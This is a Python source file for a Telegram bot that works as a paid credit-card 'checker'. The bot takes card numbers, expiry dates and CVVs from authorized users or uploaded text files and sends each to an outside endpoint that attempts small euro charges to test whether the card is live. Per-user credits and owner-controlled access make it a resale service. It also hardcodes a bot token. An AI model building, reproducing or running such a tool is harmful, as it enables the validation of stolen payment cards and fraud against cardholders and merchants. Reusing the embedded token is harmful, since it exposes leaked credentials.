import logging
import requests
import telebot
from threading import Event
import time
import json

# Telegram bot token
TOKEN = "7386696229:AAGR5SkB6NBqSogG_hUNj_uf0DkwCGKGZYc"
OWNER_ID = 7427691214  # Owner's Telegram ID

# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Define the API endpoint and static parameters
url = "https://daxxteam.com/chk/chk.php"

# Event to control the stopping of the card check process
stop_event = Event()

# Lists to store authorized group IDs and user IDs with credits
authorized_groups = []
user_credits = {}

# Load authorized groups and user credits from file (if exists)
try:
    with open('authorized_groups.json', 'r') as file:
        authorized_groups = json.load(file)
except FileNotFoundError:
    authorized_groups = []

try:
    with open('user_credits.json', 'r') as file:
        user_credits = json.load(file)
except FileNotFoundError:
    user_credits = {}

def save_authorized_groups():
    with open('authorized_groups.json', 'w') as file:
        json.dump(authorized_groups, file)

def save_user_credits():
    with open('user_credits.json', 'w') as file:
        json.dump(user_credits, file)

# Start command handler
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "Welcome! Use the /chk command followed by card details in the format `cc|mm|yyyy|cvv`, or send a TXT file with card details. Use /stop to stop the card check process.")

# /cmds command handler
@bot.message_handler(commands=['cmds'])
def send_cmds(message):
    cmds_message = (
        "Available commands:\n"
        "/start - Welcome message\n"
        "/cmds - List all commands\n"
        "/add - Authorize a group or user\n"
        "/remove - Unauthorize a group or user\n"
        "/chk - Check card details\n"
        "/stop - Stop the card check process\n"
    )
    bot.send_message(message.chat.id, cmds_message)

# /add command handler to authorize a group or user
@bot.message_handler(commands=['add'])
def add_authorization(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 3:
        bot.send_message(message.chat.id, "Usage: /add group <group_id> or /add <user_id> <credits>")
        return

    if args[1] == 'group':
        group_id = int(args[2])
        if group_id not in authorized_groups:
            authorized_groups.append(group_id)
            save_authorized_groups()
            bot.send_message(message.chat.id, f"Group {group_id} has been authorized for CC checks.")
        else:
            bot.send_message(message.chat.id, f"Group {group_id} is already authorized.")

    else:
        if len(args) != 3:
            bot.send_message(message.chat.id, "Usage: /add <user_id> <credits>")
            return
        user_id = int(args[1])
        credits = int(args[2])
        user_credits[user_id] = user_credits.get(user_id, 0) + credits
        save_user_credits()
        bot.send_message(message.chat.id, f"User {user_id} has been authorized with {credits} credits.")

# /remove command handler to unauthorize a group or user
@bot.message_handler(commands=['remove'])
def remove_authorization(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, "Usage: /remove group <group_id> or /remove userid <user_id>")
        return

    if args[1] == 'group':
        group_id = int(args[2])
        if group_id in authorized_groups:
            authorized_groups.remove(group_id)
            save_authorized_groups()
            bot.send_message(message.chat.id, f"Group {group_id} has been unauthorized.")
        else:
            bot.send_message(message.chat.id, f"Group {group_id} is not authorized.")

    elif args[1] == 'userid':
        user_id = int(args[2])
        if user_id in user_credits:
            del user_credits[user_id]
            save_user_credits()
            bot.send_message(message.chat.id, f"User {user_id} has been unauthorized.")
        else:
            bot.send_message(message.chat.id, f"User {user_id} is not authorized.")

    else:
        bot.send_message(message.chat.id, "Invalid type. Use 'group' or 'userid'.")

# /chk command handler
@bot.message_handler(commands=['chk'])
def check_card(message):
    user_id = message.from_user.id
    if user_id != OWNER_ID and user_id not in user_credits and message.chat.id not in authorized_groups:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    if user_id in user_credits and user_credits[user_id] <= 0:
        bot.send_message(message.chat.id, "You don't have enough credits to use this command.")
        return

    card_details = message.text.split()[1:]
    if not card_details:
        bot.send_message(message.chat.id, "Please provide card details in the format `cc|mm|yyyy|cvv`.")
        return

    stop_event.clear()

    for card in card_details:
        if stop_event.is_set():
            bot.send_message(message.chat.id, "Card check process stopped.")
            break

        if user_id in user_credits:
            user_credits[user_id] -= 1
            save_user_credits()

        start_time = time.time()
        params = {
            'lista': card,
            'mode': 'cvv',
            'amount': 0.5,
            'currency': 'eur'
        }
        response = requests.get(url, params=params)
        end_time = time.time()
        
        if response.headers.get('Content-Type') == 'application/json':
            try:
                response_data = response.json()
                bot.send_message(message.chat.id, response_data.get("response", "No response"))
            except requests.exceptions.JSONDecodeError:
                bot.send_message(message.chat.id, f"Failed to decode JSON response. Response content: {response.text}")
                continue
        else:
            bot.send_message(message.chat.id, response.text)

        time.sleep(10)

# Document handler
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    if user_id != OWNER_ID and user_id not in user_credits and message.chat.id not in authorized_groups:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    if user_id in user_credits and user_credits[user_id] <= 0:
        bot.send_message(message.chat.id, "You don't have enough credits to use this command.")
        return

    if message.document.mime_type == 'text/plain':
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open('lista.txt', 'wb') as f:
            f.write(downloaded_file)
        
        with open('lista.txt', 'r') as f:
            lista_values = f.readlines()
        
        stop_event.clear()

        for lista in lista_values:
            if stop_event.is_set():
                bot.send_message(message.chat.id, "Card check process stopped.")
                break

            if user_id in user_credits:
                user_credits[user_id] -= 1
                save_user_credits()

            start_time = time.time()
            lista = lista.strip()
            if lista:
                params = {
                    'lista': lista,
                    'mode': 'cvv',
                    'amount': 0.5,
                    'currency': 'eur'
                }
                response = requests.get(url, params=params)
                end_time = time.time()
                
                if response.headers.get('Content-Type') == 'application/json':
                    try:
                        response_data = response.json()
                        bot.send_message(message.chat.id, response_data.get("response", "No response"))
                    except requests.exceptions.JSONDecodeError:
                        bot.send_message(message.chat.id, f"Failed to decode JSON response. Response content: {response.text}")
                        continue
                else:
                    bot.send_message(message.chat.id, response.text)

                time.sleep(10)

# /stop command handler
@bot.message_handler(commands=['stop'])
def stop_process(message):
    if message.from_user.id == OWNER_ID:
        stop_event.set()
        bot.send_message(message.chat.id, "Card check process has been stopped.")
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    bot.polling(none_stop=True)
    
